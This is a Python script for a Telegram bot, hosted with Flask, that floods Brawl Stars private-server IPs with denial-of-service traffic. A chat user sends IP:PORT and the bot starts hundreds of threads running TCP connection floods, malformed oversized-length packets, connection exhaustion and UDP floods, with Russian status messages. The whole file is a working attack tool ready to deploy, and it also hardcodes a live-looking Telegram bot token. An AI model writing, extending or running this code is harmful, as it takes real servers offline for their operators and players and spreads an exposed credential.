#!/usr/bin/env python3
"""
BRAWL STARS / BSD BRAWL SERVER CRASHER
IP:PORT -> АТАКА | stop -> ОСТАНОВКА
"""
import socket
import struct
import threading
import random
import time
import re
import os
import logging
from flask import Flask, request
import telebot
from telebot import types

BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"

TLS_HANDSHAKE_THREADS = 150
BUFFER_OVERFLOW_THREADS = 100
KEEPALIVE_THREADS = 150
UDP_FRAG_THREADS = 100

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)
logging.getLogger('werkzeug').setLevel(logging.ERROR)

active_attacks = {}

def tls_exhaustion_attack(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            sock.send(os.urandom(random.randint(512, 4096)))
            sock.close()
        except:
            pass
        time.sleep(0.0001)

def buffer_overflow_attack(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((ip, port))
            msg_id = struct.pack(">H", random.randint(1000, 20000))
            length_field = struct.pack(">I", 0xFFFFFF)[1:]
            version = struct.pack(">I", 1)
            body = os.urandom(4)
            packet = msg_id + length_field + version + body
            for _ in range(random.randint(5, 20)):
                sock.send(packet)
            sock.close()
        except:
            pass
        time.sleep(0.0005)

def keepalive_exhaustion_attack(ip, port, stop_flag):
    connections = []
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ip, port))
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.send(b'\x00\x00\x00\x05\x00\x00\x00\x01\xFF')
            connections.append(sock)
            if len(connections) > 500:
                for old in connections[:100]:
                    try:
                        old.close()
                    except:
                        pass
                connections = connections[100:]
        except:
            pass
        time.sleep(0.001)

def udp_fragmentation_attack(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(10):
                sock.sendto(os.urandom(random.randint(1400, 8192)), (ip, port))
            sock.close()
        except:
            pass
        time.sleep(0.0001)

class Attack:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.stop_flag = threading.Event()
        self.threads = []
    def start(self):
        configs = [
            (tls_exhaustion_attack, TLS_HANDSHAKE_THREADS),
            (buffer_overflow_attack, BUFFER_OVERFLOW_THREADS),
            (keepalive_exhaustion_attack, KEEPALIVE_THREADS),
            (udp_fragmentation_attack, UDP_FRAG_THREADS),
        ]
        for func, count in configs:
            for _ in range(count):
                t = threading.Thread(target=func, args=(self.ip, self.port, self.stop_flag), daemon=True)
                self.threads.append(t)
                t.start()
    def stop(self):
        self.stop_flag.set()

def parse_target(text):
    m = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})', text)
    if m:
        return m.group(1), int(m.group(2))
    m = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
    if m:
        return m.group(1), 9339
    return None, None

@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'stop')
def stop_cmd(m):
    cid = m.chat.id
    if cid in active_attacks:
        active_attacks[cid].stop()
        bot.reply_to(m, "Атака остановлена")
        del active_attacks[cid]
    else:
        bot.reply_to(m, "Нет активной атаки")

@bot.message_handler(func=lambda m: m.text and re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
def attack_cmd(m):
    cid = m.chat.id
    ip, port = parse_target(m.text)
    if not ip:
        bot.reply_to(m, "Неверный IP")
        return
    if cid in active_attacks:
        bot.reply_to(m, "Атака уже идет! stop - остановка")
        return
    if not port:
        port = 9339
    a = Attack(ip, port)
    a.start()
    active_attacks[cid] = a
    total = TLS_HANDSHAKE_THREADS + BUFFER_OVERFLOW_THREADS + KEEPALIVE_THREADS + UDP_FRAG_THREADS
    bot.reply_to(m, f"АТАКА ЗАПУЩЕНА\n{ip}:{port}\nПотоков: {total}\nstop - остановка")

@bot.message_handler(func=lambda m: True)
def unknown(m):
    bot.reply_to(m, "Отправь IP:PORT\nПример: 34.240.15.100:9339\nstop - остановка")

@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST', 'GET'])
def webhook():
    if request.method == 'GET':
        return 'OK', 200
    try:
        update = types.Update.de_json(request.stream.read().decode('utf-8'))
        bot.process_new_updates([update])
        return 'ok', 200
    except:
        return 'error', 500

@app.route('/')
def index():
    return 'RUNNING'

if __name__ == "__main__":
    RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-service.onrender.com")
    bot.remove_webhook()
    time.sleep(0.5)
    bot.set_webhook(url=f"{RENDER_URL}/webhook/{BOT_TOKEN}")
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
